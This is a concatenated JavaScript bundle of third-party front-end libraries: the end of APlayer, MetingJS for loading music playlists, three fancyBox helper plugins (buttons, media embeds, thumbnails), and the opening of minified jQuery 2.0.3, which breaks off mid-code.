i,a=n(38),r=(i=a)&&i.__esModule?i:{default:i};console.log("\n %c APlayer v1.10.1 af84efb %c http://aplayer.js.org \n","color: #fadfa3; background: #030307; padding:5px 0;","background: #fadfa3; padding:5px 0;"),t.default=r.default}]).default});
//# sourceMappingURL=APlayer.min.js.map
'use strict';console.log('\n %c MetingJS v1.2.0 %c https://github.com/metowolf/MetingJS \n','color: #fadfa3; background: #030307; padding:5px 0;','background: #fadfa3; padding:5px 0;');var aplayers=[],loadMeting=function(){function a(a,b){var c={container:a,audio:b,mini:null,fixed:null,autoplay:!1,mutex:!0,lrcType:3,listFolded:!1,preload:'auto',theme:'#2980b9',loop:'all',order:'list',volume:null,listMaxHeight:null,customAudioType:null,storageName:'metingjs'};if(b.length){b[0].lrc||(c.lrcType=0);var d={};for(var e in c){var f=e.toLowerCase();(a.dataset.hasOwnProperty(f)||a.dataset.hasOwnProperty(e)||null!==c[e])&&(d[e]=a.dataset[f]||a.dataset[e]||c[e],('true'===d[e]||'false'===d[e])&&(d[e]='true'==d[e]))}aplayers.push(new APlayer(d))}}var b='https://api.i-meto.com/meting/api?server=:server&type=:type&id=:id&r=:r';'undefined'!=typeof meting_api&&(b=meting_api);for(var f=0;f<aplayers.length;f++)try{aplayers[f].destroy()}catch(a){console.log(a)}aplayers=[];for(var c=document.querySelectorAll('.aplayer'),d=function(){var d=c[e],f=d.dataset.id;if(f){var g=d.dataset.api||b;g=g.replace(':server',d.dataset.server),g=g.replace(':type',d.dataset.type),g=g.replace(':id',d.dataset.id),g=g.replace(':auth',d.dataset.auth),g=g.replace(':r',Math.random());var h=new XMLHttpRequest;h.onreadystatechange=function(){if(4===h.readyState&&(200<=h.status&&300>h.status||304===h.status)){var b=JSON.parse(h.responseText);a(d,b)}},h.open('get',g,!0),h.send(null)}else if(d.dataset.url){var i=[{name:d.dataset.name||d.dataset.title||'Audio name',artist:d.dataset.artist||d.dataset.author||'Audio artist',url:d.dataset.url,cover:d.dataset.cover||d.dataset.pic,lrc:d.dataset.lrc,type:d.dataset.type||'auto'}];a(d,i)}},e=0;e<c.length;e++)d()};document.addEventListener('DOMContentLoaded',loadMeting,!1);

 /*!
 * Buttons helper for fancyBox
 * version: 1.0.5 (Mon, 15 Oct 2012)
 * @requires fancyBox v2.0 or later
 *
 * Usage:
 *     $(".fancybox").fancybox({
 *         helpers : {
 *             buttons: {
 *                 position : 'top'
 *             }
 *         }
 *     });
 *
 */
;(function ($) {
	//Shortcut for fancyBox object
	var F = $.fancybox;

	//Add helper object
	F.helpers.buttons = {
		defaults : {
			skipSingle : false, // disables if gallery contains single image
			position   : 'top', // 'top' or 'bottom'
			tpl        : '<div id="fancybox-buttons"><ul><li><a class="btnPrev" title="Previous" href="javascript:;"></a></li><li><a class="btnPlay" title="Start slideshow" href="javascript:;"></a></li><li><a class="btnNext" title="Next" href="javascript:;"></a></li><li><a class="btnToggle" title="Toggle size" href="javascript:;"></a></li><li><a class="btnClose" title="Close" href="javascript:;"></a></li></ul></div>'
		},

		list : null,
		buttons: null,

		beforeLoad: function (opts, obj) {
			//Remove self if gallery do not have at least two items

			if (opts.skipSingle && obj.group.length < 2) {
				obj.helpers.buttons = false;
				obj.closeBtn = true;

				return;
			}

			//Increase top margin to give space for buttons
			obj.margin[ opts.position === 'bottom' ? 2 : 0 ] += 30;
		},

		onPlayStart: function () {
			if (this.buttons) {
				this.buttons.play.attr('title', 'Pause slideshow').addClass('btnPlayOn');
			}
		},

		onPlayEnd: function () {
			if (this.buttons) {
				this.buttons.play.attr('title', 'Start slideshow').removeClass('btnPlayOn');
			}
		},

		afterShow: function (opts, obj) {
			var buttons = this.buttons;

			if (!buttons) {
				this.list = $(opts.tpl).addClass(opts.position).appendTo('body');

				buttons = {
					prev   : this.list.find('.btnPrev').click( F.prev ),
					next   : this.list.find('.btnNext').click( F.next ),
					play   : this.list.find('.btnPlay').click( F.play ),
					toggle : this.list.find('.btnToggle').click( F.toggle ),
					close  : this.list.find('.btnClose').click( F.close )
				}
			}

			//Prev
			if (obj.index > 0 || obj.loop) {
				buttons.prev.removeClass('btnDisabled');
			} else {
				buttons.prev.addClass('btnDisabled');
			}

			//Next / Play
			if (obj.loop || obj.index < obj.group.length - 1) {
				buttons.next.removeClass('btnDisabled');
				buttons.play.removeClass('btnDisabled');

			} else {
				buttons.next.addClass('btnDisabled');
				buttons.play.addClass('btnDisabled');
			}

			this.buttons = buttons;

			this.onUpdate(opts, obj);
		},

		onUpdate: function (opts, obj) {
			var toggle;

			if (!this.buttons) {
				return;
			}

			toggle = this.buttons.toggle.removeClass('btnDisabled btnToggleOn');

			//Size toggle button
			if (obj.canShrink) {
				toggle.addClass('btnToggleOn');

			} else if (!obj.canExpand) {
				toggle.addClass('btnDisabled');
			}
		},

		beforeClose: function () {
			if (this.list) {
				this.list.remove();
			}

			this.list    = null;
			this.buttons = null;
		}
	};

}(jQuery));

/*!
 * Media helper for fancyBox
 * version: 1.0.6 (Fri, 14 Jun 2013)
 * @requires fancyBox v2.0 or later
 *
 * Usage:
 *     $(".fancybox").fancybox({
 *         helpers : {
 *             media: true
 *         }
 *     });
 *
 * Set custom URL parameters:
 *     $(".fancybox").fancybox({
 *         helpers : {
 *             media: {
 *                 youtube : {
 *                     params : {
 *                         autoplay : 0
 *                     }
 *                 }
 *             }
 *         }
 *     });
 *
 * Or:
 *     $(".fancybox").fancybox({,
 *         helpers : {
 *             media: true
 *         },
 *         youtube : {
 *             autoplay: 0
 *         }
 *     });
 *
 *  Supports:
 *
 *      Youtube
 *          http://www.youtube.com/watch?v=opj24KnzrWo
 *          http://www.youtube.com/embed/opj24KnzrWo
 *          http://youtu.be/opj24KnzrWo
 *			http://www.youtube-nocookie.com/embed/opj24KnzrWo
 *      Vimeo
 *          http://vimeo.com/40648169
 *          http://vimeo.com/channels/staffpicks/38843628
 *          http://vimeo.com/groups/surrealism/videos/36516384
 *          http://player.vimeo.com/video/45074303
 *      Metacafe
 *          http://www.metacafe.com/watch/7635964/dr_seuss_the_lorax_movie_trailer/
 *          http://www.metacafe.com/watch/7635964/
 *      Dailymotion
 *          http://www.dailymotion.com/video/xoytqh_dr-seuss-the-lorax-premiere_people
 *      Twitvid
 *          http://twitvid.com/QY7MD
 *      Twitpic
 *          http://twitpic.com/7p93st
 *      Instagram
 *          http://instagr.am/p/IejkuUGxQn/
 *          http://instagram.com/p/IejkuUGxQn/
 *      Google maps
 *          http://maps.google.com/maps?q=Eiffel+Tower,+Avenue+Gustave+Eiffel,+Paris,+France&t=h&z=17
 *          http://maps.google.com/?ll=48.857995,2.294297&spn=0.007666,0.021136&t=m&z=16
 *          http://maps.google.com/?ll=48.859463,2.292626&spn=0.000965,0.002642&t=m&z=19&layer=c&cbll=48.859524,2.292532&panoid=YJ0lq28OOy3VT2IqIuVY0g&cbp=12,151.58,,0,-15.56
 */
;(function ($) {
	"use strict";

	//Shortcut for fancyBox object
	var F = $.fancybox,
		format = function( url, rez, params ) {
			params = params || '';

			if ( $.type( params ) === "object" ) {
				params = $.param(params, true);
			}

			$.each(rez, function(key, value) {
				url = url.replace( '$' + key, value || '' );
			});

			if (params.length) {
				url += ( url.indexOf('?') > 0 ? '&' : '?' ) + params;
			}

			return url;
		};

	//Add helper object
	F.helpers.media = {
		defaults : {
			youtube : {
				matcher : /(youtube\.com|youtu\.be|youtube-nocookie\.com)\/(watch\?v=|v\/|u\/|embed\/?)?(videoseries\?list=(.*)|[\w-]{11}|\?listType=(.*)&list=(.*)).*/i,
				params  : {
					autoplay    : 1,
					autohide    : 1,
					fs          : 1,
					rel         : 0,
					hd          : 1,
					wmode       : 'opaque',
					enablejsapi : 1
				},
				type : 'iframe',
				url  : '//www.youtube.com/embed/$3'
			},
			vimeo : {
				matcher : /(?:vimeo(?:pro)?.com)\/(?:[^\d]+)?(\d+)(?:.*)/,
				params  : {
					autoplay      : 1,
					hd            : 1,
					show_title    : 1,
					show_byline   : 1,
					show_portrait : 0,
					fullscreen    : 1
				},
				type : 'iframe',
				url  : '//player.vimeo.com/video/$1'
			},
			metacafe : {
				matcher : /metacafe.com\/(?:watch|fplayer)\/([\w\-]{1,10})/,
				params  : {
					autoPlay : 'yes'
				},
				type : 'swf',
				url  : function( rez, params, obj ) {
					obj.swf.flashVars = 'playerVars=' + $.param( params, true );

					return '//www.metacafe.com/fplayer/' + rez[1] + '/.swf';
				}
			},
			dailymotion : {
				matcher : /dailymotion.com\/video\/(.*)\/?(.*)/,
				params  : {
					additionalInfos : 0,
					autoStart : 1
				},
				type : 'swf',
				url  : '//www.dailymotion.com/swf/video/$1'
			},
			twitvid : {
				matcher : /twitvid\.com\/([a-zA-Z0-9_\-\?\=]+)/i,
				params  : {
					autoplay : 0
				},
				type : 'iframe',
				url  : '//www.twitvid.com/embed.php?guid=$1'
			},
			twitpic : {
				matcher : /twitpic\.com\/(?!(?:place|photos|events)\/)([a-zA-Z0-9\?\=\-]+)/i,
				type : 'image',
				url  : '//twitpic.com/show/full/$1/'
			},
			instagram : {
				matcher : /(instagr\.am|instagram\.com)\/p\/([a-zA-Z0-9_\-]+)\/?/i,
				type : 'image',
				url  : '//$1/p/$2/media/?size=l'
			},
			google_maps : {
				matcher : /maps\.google\.([a-z]{2,3}(\.[a-z]{2})?)\/(\?ll=|maps\?)(.*)/i,
				type : 'iframe',
				url  : function( rez ) {
					return '//maps.google.' + rez[1] + '/' + rez[3] + '' + rez[4] + '&output=' + (rez[4].indexOf('layer=c') > 0 ? 'svembed' : 'embed');
				}
			}
		},

		beforeLoad : function(opts, obj) {
			var url   = obj.href || '',
				type  = false,
				what,
				item,
				rez,
				params;

			for (what in opts) {
				if (opts.hasOwnProperty(what)) {
					item = opts[ what ];
					rez  = url.match( item.matcher );

					if (rez) {
						type   = item.type;
						params = $.extend(true, {}, item.params, obj[ what ] || ($.isPlainObject(opts[ what ]) ? opts[ what ].params : null));

						url = $.type( item.url ) === "function" ? item.url.call( this, rez, params, obj ) : format( item.url, rez, params );

						break;
					}
				}
			}

			if (type) {
				obj.href = url;
				obj.type = type;

				obj.autoHeight = false;
			}
		}
	};

}(jQuery));
 /*!
 * Thumbnail helper for fancyBox
 * version: 1.0.7 (Mon, 01 Oct 2012)
 * @requires fancyBox v2.0 or later
 *
 * Usage:
 *     $(".fancybox").fancybox({
 *         helpers : {
 *             thumbs: {
 *                 width  : 50,
 *                 height : 50
 *             }
 *         }
 *     });
 *
 */
;(function ($) {
	//Shortcut for fancyBox object
	var F = $.fancybox;

	//Add helper object
	F.helpers.thumbs = {
		defaults : {
			width    : 50,       // thumbnail width
			height   : 50,       // thumbnail height
			position : 'bottom', // 'top' or 'bottom'
			source   : function ( item ) {  // function to obtain the URL of the thumbnail image
				var href;

				if (item.element) {
					href = $(item.element).find('img').attr('src');
				}

				if (!href && item.type === 'image' && item.href) {
					href = item.href;
				}

				return href;
			}
		},

		wrap  : null,
		list  : null,
		width : 0,

		init: function (opts, obj) {
			var that = this,
				list,
				thumbWidth  = opts.width,
				thumbHeight = opts.height,
				thumbSource = opts.source;

			//Build list structure
			list = '';

			for (var n = 0; n < obj.group.length; n++) {
				list += '<li><a style="width:' + thumbWidth + 'px;height:' + thumbHeight + 'px;" href="javascript:jQuery.fancybox.jumpto(' + n + ');"></a></li>';
			}

			this.wrap = $('<div id="fancybox-thumbs"></div>').addClass(opts.position).appendTo('body');
			this.list = $('<ul>' + list + '</ul>').appendTo(this.wrap);

			//Load each thumbnail
			$.each(obj.group, function (i) {
				var el   = obj.group[ i ],
					href = thumbSource( el );

				if (!href) {
					return;
				}

				$("<img />").load(function () {
					var width  = this.width,
						height = this.height,
						widthRatio, heightRatio, parent;

					if (!that.list || !width || !height) {
						return;
					}

					//Calculate thumbnail width/height and center it
					widthRatio  = width / thumbWidth;
					heightRatio = height / thumbHeight;

					parent = that.list.children().eq(i).find('a');

					if (widthRatio >= 1 && heightRatio >= 1) {
						if (widthRatio > heightRatio) {
							width  = Math.floor(width / heightRatio);
							height = thumbHeight;

						} else {
							width  = thumbWidth;
							height = Math.floor(height / widthRatio);
						}
					}

					$(this).css({
						width  : width,
						height : height,
						top    : Math.floor(thumbHeight / 2 - height / 2),
						left   : Math.floor(thumbWidth / 2 - width / 2)
					});

					parent.width(thumbWidth).height(thumbHeight);

					$(this).hide().appendTo(parent).fadeIn(300);

				})
				.attr('src',   href)
				.attr('title', el.title);
			});

			//Set initial width
			this.width = this.list.children().eq(0).outerWidth(true);

			this.list.width(this.width * (obj.group.length + 1)).css('left', Math.floor($(window).width() * 0.5 - (obj.index * this.width + this.width * 0.5)));
		},

		beforeLoad: function (opts, obj) {
			//Remove self if gallery do not have at least two items
			if (obj.group.length < 2) {
				obj.helpers.thumbs = false;

				return;
			}

			//Increase bottom margin to give space for thumbs
			obj.margin[ opts.position === 'top' ? 0 : 2 ] += ((opts.height) + 15);
		},

		afterShow: function (opts, obj) {
			//Check if exists and create or update list
			if (this.list) {
				this.onUpdate(opts, obj);

			} else {
				this.init(opts, obj);
			}

			//Set active element
			this.list.children().removeClass('active').eq(obj.index).addClass('active');
		},

		//Center list
		onUpdate: function (opts, obj) {
			if (this.list) {
				this.list.stop(true).animate({
					'left': Math.floor($(window).width() * 0.5 - (obj.index * this.width + this.width * 0.5))
				}, 150);
			}
		},

		beforeClose: function () {
			if (this.wrap) {
				this.wrap.remove();
			}

			this.wrap  = null;
			this.list  = null;
			this.width = 0;
		}
	}

}(jQuery));
/*! jQuery v2.0.3 | (c) 2005, 2013 jQuery Foundation, Inc. | jquery.org/license
//@ sourceMappingURL=jquery-2.0.3.min.map
*/
(function(e,undefined){var t,n,r=typeof undefined,i=e.location,o=e.document,s=o.documentElement,a=e.jQuery,u=e.$,l={},c=[],p="2.0.3",f=c.concat,h=c.push,d=c.slice,g=c.indexOf,m=l.toString,y=l.hasOwnProperty,v=p.trim,x=function(e,n){return new x.fn.init(e,n,t)},b=/[+-]?(?:\d*\.|)\d+(?:[eE][+-]?\d+|)/.source,w=/\S+/g,T=/^(?:\s*(<[\w\W]+>)[^>]*|#([\w-]*))$/,C=/^<(\w+)\s*\/?>(?:<\/\1>|)$/,k=/^-ms-/,N=/-([\da-z])/gi,E=function(e,t){return t.toUpperCase()},S=function(){o.removeEventListener("DOMContentLoaded",S,!1),e.removeEventListener("load",S,!1),x.ready()};x.fn=x.prototype={jquery:p,constructor:x,init:function(e,t,n){var r,i;if(!e)return this;if("string"==typeof e){if(r="<"===e.charAt(0)&&">"===e.charAt(e.length-1)&&e.length>=3?[null,e,null]:T.exec(e),!r||!r[1]&&t)return!t||t.jquery?(t||n).find(e):this.constructor(t).find(e);if(r[1]){if(t=t instanceof x?t[0]:t,x.merge(this,x.parseHTML(r[1],t&&t.nodeType?t.ownerDocument||t:o,!0)),C.test(r[1])&&x.isPlainObject(t))for(r in t)x.isFunction(this[r])?this[r](t[r]):this.attr(r,t[r]);return this}return i=o.getElementById(r[2]),i&&i.parentNode&&(this.length=1,this[0]=i),this.context=o,this.selector=e,this}return e.nodeType?(this.context=this[0]=e,this.length=1,this):x.isFunction(e)?n.ready(e):(e.selector!==undefined&&(this.selector=e.selector,this.context=e.context),x.makeArray(e,this))},selector:"",length:0,toArray:function(){return d.call(this)},get:function(e){return null==e?this.toArray():0>e?this[this.length+e]:this[e]},pushStack:function(e){var t=x.merge(this.constructor(),e);return t.prevObject=this,t.context=this.context,t},each:function(e,t){return x.each(this,e,t)},ready:function(e){return x.ready.promise().done(e),this},slice:function(){return this.pushStack(d.apply(this,arguments))},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},eq:function(e){var t=this.length,n=+e+(0>e?t:0);return this.pushStack(n>=0&&t>n?[this[n]]:[])},map:function(e){return this.pushStack(x.map(this,function(t,n){return e.call(t,n,t)}))},end:function(){return this.prevObject||this.constructor(null)},push:h,sort:[].sort,splice:[].splice},x.fn.init.prototype=x.fn,x.extend=x.fn.extend=function(){var e,t,n,r,i,o,s=arguments[0]||{},a=1,u=arguments.length,l=!1;for("boolean"==typeof s&&(l=s,s=arguments[1]||{},a=2),"object"==typeof s||x.isFunction(s)||(s={}),u===a&&(s=this,--a);u>a;a++)if(null!=(e=arguments[a]))for(t in e)n=s[t],r=e[t],s!==r&&(l&&r&&(x.isPlainObject(r)||(i=x.isArray(r)))?(i?(i=!1,o=n&&x.isArray(n)?n:[]):o=n&&x.isPlainObject(n)?n:{},s[t]=x.extend(l,o,r)):r!==undefined&&(s[t]=r));return s},x.extend({expando:"jQuery"+(p+Math.random()).replace(/\D/g,""),noConflict:function(t){return e.$===x&&(e.$=u),t&&e.jQuery===x&&(e.jQuery=a),x},isReady:!1,readyWait:1,holdReady:function(e){e?x.readyWait++:x.ready(!0)},ready:function(e){(e===!0?--x.readyWait:x.isReady)||(x.isReady=!0,e!==!0&&--x.readyWait>0||(n.resolveWith(o,[x]),x.fn.trigger&&x(o).trigger("ready").off("ready")))},isFunction:function(e){return"function"===x.type(e)},isArray:Array.isArray,isWindow:function(e){return null!=e&&e===e.window},isNumeric:function(e){return!isNaN(parseFloat(e))&&isFinite(e)},type:function(e){return null==e?e+"":"object"==typeof e||"function"==typeof e?l[m.call(e)]||"object":typeof e},isPlainObject:function(e){if("object"!==x.type(e)||e.nodeType||x.isWindow(e))return!1;try{if(e.constructor&&!y.call(e.constructor.prototype,"isPrototypeOf"))return!1}catch(t){return!1}return!0},isEmptyObject:function(e){var t;for(t in e)return!1;return!0},error:function(e){throw Error(e)},parseHTML:function(e,t,n){if(!e||"string"!=typeof e)return null;"boolean"==typeof t&&(n=t,t=!1),t=t||o;var r=C.exec(e),i=!n&&[];return r?[t.createElement(r[1])]:(r=x.buildFragment([e],t,i),i&&x(i).remove(),x.merge([],r.childNodes))},parseJSON:JSON.parse,parseXML:function(e){var t,n;if(!e||"string"!=typeof e)return null;try{n=new DOMParser,t=n.parseFromString(e,"text/xml")}catch(r){t=undefined}return(!t||t.getElementsByTagName("parsererror").length)&&x.error("Invalid XML: "+e),t},noop:function(){},globalEval:function(e){var t,n=eval;e=x.trim(e),e&&(1===e.indexOf("use strict")?(t=o.createElement("script"),t.text=e,o.head.appendChild(t).parentNode.removeChild(t)):n(e))},camelCase:function(e){return e.replace(k,"ms-").replace(N,E)},nodeName:function(e,t){return e.nodeName&&e.nodeName.toLowerCase()===t.toLowerCase()},each:function(e,t,n){var r,i=0,o=e.length,s=j(e);if(n){if(s){for(;o>i;i++)if(r=t.apply(e[i],n),r===!1)break}else for(i in e)if(r=t.apply(e[i],n),r===!1)break}else if(s){for(;o>i;i++)if(r=t.call(e[i],i,e[i]),r===!1)break}else for(i in e)if(r=t.call(e[i],i,e[i]),r===!1)break;return e},trim:function(e){return null==e?"":v.call(e)},makeArray:function(e,t){var n=t||[];return null!=e&&(j(Object(e))?x.merge(n,"string"==typeof e?[e]:e):h.call(n,e)),n},inArray:function(e,t,n){return null==t?-1:g.call(t,e,n)},merge:function(e,t){var n=t.length,r=e.length,i=0;if("number"==typeof n)for(;n>i;i++)e[r++]=t[i];else while(t[i]!==undefined)e[r++]=t[i++];return e.length=r,e},grep:function(e,t,n){var r,i=[],o=0,s=e.length;for(n=!!n;s>o;o++)r=!!t(e[o],o),n!==r&&i.push(e[o]);return i},map:function(e,t,n){var r,i=0,o=e.length,s=j(e),a=[];if(s)for(;o>i;i++)r=t(e[i],i,n),null!=r&&(a[a.length]=r);else for(i in e)r=t(e[i],i,n),null!=r&&(a[a.length]=r);return f.apply([],a)},guid:1,proxy:function(e,t){var n,r,i;return"string"==typeof t&&(n=e[t],t=e,e=n),x.isFunction(e)?(r=d.call(arguments,2),i=function(){return e.apply(t||this,r.concat(d.call(arguments)))},i.guid=e.guid=e.guid||x.guid++,i):undefined},access:function(e,t,n,r,i,o,s){var a=0,u=e.length,l=null==n;if("object"===x.type(n)){i=!0;for(a in n)x.access(e,t,a,n[a],!0,o,s)}else if(r!==undefined&&(i=!0,x.isFunction(r)||(s=!0),l&&(s?(t.call(e,r),t=null):(l=t,t=function(e,t,n){return l.call(x(e),n)})),t))for(;u>a;a++)t(e[a],n,s?r:r.call(e[a],a,t(e[a],n)));return i?e:l?t.call(e):u?t(e[0],n):o},now:Date.now,swap:function(e,t,n,r){var i,o,s={};for(o in t)s[o]=e.style[o],e.style[o]=t[o];i=n.apply(e,r||[]);for(o in t)e.style[o]=s[o];return i}}),x.ready.promise=function(t){return n||(n=x.Deferred(),"complete"===o.readyState?setTimeout(x.ready):(o.addEventListener("DOMContentLoaded",S,!1),e.addEventListener("load",S,!1))),n.promise(t)},x.each("Boolean Number String Function Array Date RegExp Object Error".split(" "),function(e,t){l["[object "+t+"]"]=t.toLowerCase()});function j(e){var t=e.length,n=x.type(e);return x.isWindow(e)?!1:1===e.nodeType&&t?!0:"array"===n||"function"!==n&&(0===t||"number"==typeof t&&t>0&&t-1 in e)}t=x(o),function(e,undefined){var t,n,r,i,o,s,a,u,l,c,p,f,h,d,g,m,y,v="sizzle"+-new Date,b=e.document,w=0,T=0,C=st(),k=st(),N=st(),E=!1,S=function(e,t){return e===t?(E=!0,0):0},j=typeof undefined,D=1<<31,A={}.hasOwnProperty,L=[],q=L.pop,H=L.push,O=L.push,F=L.slice,P=L.indexOf||function(e){var t=0,n=this.length;for(;n>t;t++)if(this[t]===e)return t;return-1},R="checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped",M="[\\x20\\t\\r\\n\\f]",W="(?:\\\\.|[\\w-]|[^\\x00-\\xa0])+",$=W.replace("w","w#"),B="\\["+M+"*("+W+")"+M+"*(?:([*^$|!~]?=)"+M+"*(?:(['\"])((?:\\\\.|[^\\\\])*?)\\3|("+$+")|)|)"+M+"*\\]",I=":("+W+")(?:\\(((['\"])((?:\\\\.|[^\\\\])*?)\\3|((?:\\\\.|[^\\\\()[\\]]|"+B.replace(3,8)+")*)|.*)\\)|)",z=RegExp("^"+M+"+|((?:^|[^\\\\])(?:\\\\.)*)"+M+"+$","g"),_=RegExp("^"+M+"*,"+M+"*"),X=RegExp("^"+M+"*([>+~]|"+M+")"+M+"*"),U=RegExp(M+"*[+~]"),Y=RegExp("="+M+"*([^\\]'\"]*)"+M+"*\\]","g"),V=RegExp(I),G=RegExp("^"+$+"$"),J={ID:RegExp("^#("+W+")"),CLASS:RegExp("^\\.("+W+")"),TAG:RegExp("^("+W.replace("w","w*")+")"),ATTR:RegExp("^"+B),PSEUDO:RegExp("^"+I),CHILD:RegExp("^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\("+M+"*(even|odd|(([+-]|)(\\d*)n|)"+M+"*(?:([+-]|)"+M+"*(\\d+)|))"+M+"*\\)|)","i"),bool:RegExp("^(?:"+R+")$","i"),needsContext:RegExp("^"+M+"*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\("+M+"*((?:-\\d)?\\d*)"+M+"*\\)|)(?=[^-]|$)","i")},Q=/^[^{]+\{\s*\[native \w/,K=/^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/,Z=/^(?:input|select|textarea|button)$/i,et=/^h\d$/i,tt=/'|\\/g,nt=RegExp("\\\\([\\da-f]{1,6}"+M+"?|("+M+")|.)","ig"),rt=function(e,t,n){var r="0x"+t-65536;return r!==r||n?t:0>r?String.fromCharCode(r+65536):String.fromCharCode(55296|r>>10,56320|1023&r)};try{O.apply(L=F.call(b.childNodes),b.childNodes),L[b.childNodes.length].nodeType}catch(it){O={apply:L.length?function(e,t){H.apply(e,F.call(t))}:function(e,t){var n=e.length,r=0;while(e[n++]=t[r++]);e.length=n-1}}}function ot(e,t,r,i){var o,s,a,u,l,f,g,m,x,w;if((t?t.ownerDocument||t:b)!==p&&c(t),t=t||p,r=r||[],!e||"string"!=typeof e)return r;if(1!==(u=t.nodeType)&&9!==u)return[];if(h&&!i){if(o=K.exec(e))if(a=o[1]){if(9===u){if(s=t.getElementById(a),!s||!s.parentNode)return r;if(s.id===a)return r.push(s),r}else if(t.ownerDocument&&(s=t.ownerDocument.getElementById(a))&&y(t,s)&&s.id===a)return r.push(s),r}else{if(o[2])return O.apply(r,t.getElementsByTagName(e)),r;if((a=o[3])&&n.getElementsByClassName&&t.getElementsByClassName)return O.apply(r,t.getElementsByClassName(a)),r}if(n.qsa&&(!d||!d.test(e))){if(m=g=v,x=t,w=9===u&&e,1===u&&"object"!==t.nodeName.toLowerCase()){f=gt(e),(g=t.getAttribute("id"))?m=g.replace(tt,"\\$&"):t.setAttribute("id",m),m="[id='"+m+"'] ",l=f.length;while(l--)f[l]=m+mt(f[l]);x=U.test(e)&&t.parentNode||t,w=f.join(",")}if(w)try{return O.apply(r,x.querySelectorAll(w)),r}catch(T){}finally{g||t.removeAttribute("id")}}}return kt(e.replace(z,"$1"),t,r,i)}function st(){var e=[];function t(n,r){return e.push(n+=" ")>i.cacheLength&&delete t[e.shift()],t[n]=r}return t}function at(e){return e[v]=!0,e}function ut(e){var t=p.createElement("div");try{return!!e(t)}catch(n){return!1}finally{t.parentNode&&t.parentNode.removeChild(t),t=null}}function lt(e,t){var n=e.split("|"),r=e.length;while(r--)i.attrHandle[n[r]]=t}function ct(e,t){var n=t&&e,r=n&&1===e.nodeType&&1===t.nodeType&&(~t.sourceIndex||D)-(~e.sourceIndex||D);if(r)return r;if(n)while(n=n.nextSibling)if(n===t)return-1;return e?1:-1}function pt(e){return function(t){var n=t.nodeName.toLowerCase();return"input"===n&&t.type===e}}function ft(e){return function(t){var n=t.nodeName.toLowerCase();return("input"===n||"button"===n)&&t.type===e}}function ht(e){return at(function(t){return t=+t,at(function(n,r){var i,o=e([],n.length,t),s=o.length;while(s--)n[i=o[s]]&&(n[i]=!(r[i]=n[i]))})})}s=ot.isXML=function(e){var t=e&&(e.ownerDocument||e).documentElement;return t?"HTML"!==t.nodeName:!1},n=ot.support={},c=ot.setDocument=function(e){var t=e?e.ownerDocument||e:b,r=t.defaultView;return t!==p&&9===t.nodeType&&t.documentElement?(p=t,f=t.documentElement,h=!s(t),r&&r.attachEvent&&r!==r.top&&r.attachEvent("onbeforeunload",function(){c()}),n.attributes=ut(function(e){return e.className="i",!e.getAttribute("className")}),n.getElementsByTagName=ut(function(e){return e.appendChild(t.createComment("")),!e.getElementsByTagName("*").length}),n.getElementsByClassName=ut(function(e){return e.innerHTML="<div class='a'></div><div class='a i'></div>",e.firstChild.className="i",2===e.getElementsByClassName("i").length}),n.getById=ut(function(e){return f.appendChild(e).id=v,!t.getElementsByName||!t.getElementsByName(v).length}),n.getById?(i.find.ID=function(e,t){if(typeof t.getElementById!==j&&h){var n=t.getElementById(e);return n&&n.parentNode?[n]:[]}},i.filter.ID=function(e){var t=e.replace(nt,rt);return function(e){return e.getAttribute("id")===t}}):(delete i.find.ID,i.filter.ID=function(e){var t=e.replace(nt,rt);return function(e){var n=typeof e.getAttributeNode!==j&&e.getAttributeNode("id");return n&&n.value===t}}),i.find.TAG=n.getElementsByTagName?function(e,t){return typeof t.getElementsByTagName!==j?t.getElementsByTagName(e):undefined}:function(e,t){var n,r=[],i=0,o=t.getElementsByTagName(e);if("*"===e){while(n=o[i++])1===n.nodeType&&r.push(n);return r}return o},i.find.CLASS=n.getElementsByClassName&&function(e,t){return typeof t.getElementsByClassName!==j&&h?t.getElementsByClassName(e):undefined},g=[],d=[],(n.qsa=Q.test(t.querySelectorAll))&&(ut(function(e){e.innerHTML="<select><option selected=''></option></select>",e.querySelectorAll("[selected]").length||d.push("\\["+M+"*(?:value|"+R+")"),e.querySelectorAll(":checked").length||d.push(":checked")}),ut(function(e){var n=t.createElement("input");n.setAttribute("type","hidden"),e.appendChild(n).setAttribute("t",""),e.querySelectorAll("[t^='']").length&&d.push("[*^$]="+M+"*(?:''|\"\")"),e.querySelectorAll(":enabled").length||d.push(":enabled",":disabled"),e.querySelectorAll("*,:x"),d.push(",.*:")})),(n.matchesSelector=Q.test(m=f.webkitMatchesSelector||f.mozMatchesSelector||f.oMatchesSelector||f.msMatchesSelector))&&ut(function(e){n.disconnectedMatch=m.call(e,"div"),m.call(e,"[s!='']:x"),g.push("!=",I)}),d=d.length&&RegExp(d.join("|")),g=g.length&&RegExp(g.join("|")),y=Q.test(f.contains)||f.compareDocumentPosition?function(e,t){var n=9===e.nodeType?e.documentElement:e,r=t&&t.parentNode;return e===r||!(!r||1!==r.nodeType||!(n.contains?n.contains(r):e.compareDocumentPosition&&16&e.compareDocumentPosition(r)))}:function(e,t){if(t)while(t=t.parentNode)if(t===e)return!0;return!1},S=f.compareDocumentPosition?function(e,r){if(e===r)return E=!0,0;var i=r.compareDocumentPosition&&e.compareDocumentPosition&&e.compareDocumentPosition(r);return i?1&i||!n.sortDetached&&r.compareDocumentPosition(e)===i?e===t||y(b,e)?-1:r===t||y(b,r)?1:l?P.call(l,e)-P.call(l,r):0:4&i?-1:1:e.compareDocumentPosition?-1:1}:function(e,n){var r,i=0,o=e.parentNode,s=n.parentNode,a=[e],u=[n];if(e===n)return E=!0,0;if(!o||!s)return e===t?-1:n===t?1:o?-1:s?1:l?P.call(l,e)-P.call(l,n):0;if(o===s)return ct(e,n);r=e;while(r=r.parentNode)a.unshift(r);r=n;while(r=r.parentNode)u.unshift(r);while(a[i]===u[i])i++;return i?ct(a[i],u[i]):a[i]===b?-1:u[i]===b?1:0},t):p},ot.matches=function(e,t){return ot(e,null,null,t)},ot.matchesSelector=function(e,t){if((e.ownerDocument||e)!==p&&c(e),t=t.replace(Y,"='$1']"),!(!n.matchesSelector||!h||g&&g.test(t)||d&&d.test(t)))try{var r=m.call(e,t);if(r||n.disconnectedMatch||e.document&&11!==e.document.nodeType)return r}catch(i){}return 